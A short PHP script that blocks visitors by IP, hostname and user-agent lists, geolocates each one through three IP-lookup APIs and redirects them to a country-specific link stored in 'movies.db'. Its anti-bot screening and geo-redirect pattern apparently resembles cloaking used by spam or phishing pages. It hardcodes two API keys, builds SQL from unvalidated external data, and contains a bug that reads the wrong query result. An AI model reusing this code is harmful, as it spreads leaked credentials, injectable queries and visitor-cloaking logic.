<?php

 /* banned IP */ 
$IP_Connected = $_SERVER['REMOTE_ADDR']; 
$IP_Banned=array();
 foreach($IP_Banned as $Ip_word) { 
    if ( @substr_count($IP_Connected, $Ip_word) > 0) { 
	    echo "<h1>Access Denied</h1>"; 
	    exit();
    } 
    
 }

 /* DENIED HOST */ 
$HostName = gethostbyaddr($_SERVER['REMOTE_ADDR']); 
$Blocked_keywords=array();
 foreach($Blocked_keywords as $keyword) { 
    if ( @substr_count($HostName, $keyword) > 0) { 
	    echo "<h1>Access Denied</h1>"; 
	    exit();
    } 
 }
 /* DENIED USERAGENT */ 
$UserAgent = $_SERVER['HTTP_USER_AGENT']; 
$UserAgent_blocked=array();
foreach($UserAgent_blocked as $Agent_bot) {
	 if (substr_count($UserAgent, $Agent_bot) > 0) {
		 echo "<h1>Access Denied</h1>";
		 exit(); 
		} 
	}
    //API IPSTACK
	$access_key = 'a2947addf0a1bf8828b41a11cf7212ec' ;
    //  $IP_Connected='51.158.117.189';
	// Initialiser CURL :// Initialiser CURL :
	$ch1 = curl_init('http://api.ipstack.com/'.$IP_Connected.'?access_key='.$access_key.'');
	curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1); 
	
	// Stocke les données :// Stocke les données :
	$json = curl_exec($ch1);
	curl_close($ch1);
	
	// Décode la réponse JSON :// Décode la réponse JSON :
	$api_result = json_decode($json, true);
	// print_r($api_result);
	// Sortie de l'objet "capital" à l'intérieur de "location
	$country1=$api_result["country_code"];
     //API ipgeolocation
    $url = "https://api.ipgeolocation.io/ipgeo?apiKey=c12d9abdfd254517abb8c38f0b80603d&ip=".$IP_Connected;
    $ch = curl_init();  
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        echo $error_msg;
    }
    $arr_result = json_decode($response, true);
    $country2=$arr_result["country_code2"];
    //   API geoplugin
    $ipdat = "http://www.geoplugin.net/json.gp?ip=".$IP_Connected;
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $ipdat);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        echo $error_msg;
    }
    $result = json_decode($response, true);
    $country3=$result["geoplugin_countryCode"];
    $pdo=new PDO('sqlite:movies.db');
    $statement1 =$pdo->query("SELECT Link FROM Links WHERE code_country='$country3'");
    $alien=$statement1->fetchColumn();
    $statement2 =$pdo->query("SELECT Link FROM Links WHERE code_country='$country2'");
    $blien=$statement2->fetchColumn();
    $statement3 =$pdo->query("SELECT Link FROM Links WHERE code_country='$country1'");
    $Clien=$statement1->fetchColumn();
    $statement1 =$pdo->query("SELECT * FROM Links");
    $lien=$statement1->fetchColumn();
    // print_r($lien);
    // print_r($country1);
     if(!empty($country1)){
        header('Location:'.$Clien);
     }elseif(!empty($country2)){
        header('Location:'.$blien);
     }elseif(!empty($country3)){
        header('Location:'.$alien);
     }
    ?>